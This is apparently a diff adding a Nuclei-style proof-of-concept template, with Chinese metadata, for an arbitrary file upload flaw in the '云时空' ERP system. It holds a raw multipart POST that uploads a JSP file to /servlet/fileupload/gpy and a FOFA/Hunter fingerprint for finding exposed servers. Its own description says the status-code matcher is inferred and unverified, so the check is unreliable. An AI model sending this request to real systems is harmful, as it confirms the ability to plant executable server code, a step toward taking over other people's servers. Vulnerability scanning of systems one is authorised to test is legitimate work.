@@ -1,0 +1,51 @@
+id: poc-1bff965b974279e7e817
+info:
+  name: 云时空社会化商业ERP系统gpy任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/1bff965b974279e7e8179e661e869013
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 1bff965b974279e7e8179e661e869013
+    fofa: + hunter`web.body="/static/plugin/lhgdialog/skins/default.css"`
+http:
+- raw:
+  - 'POST /servlet/fileupload/gpy HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Type: multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A1388
+
+    Content-Length: 221
+
+
+    --4eea98d02AEa93f60ea08dE3C18A1388
+
+    Content-Disposition: form-data; name="file1"; filename="stc.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    <% out.println("123"); %>
+
+    --4eea98d02AEa93f60ea08dE3C18A1388--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
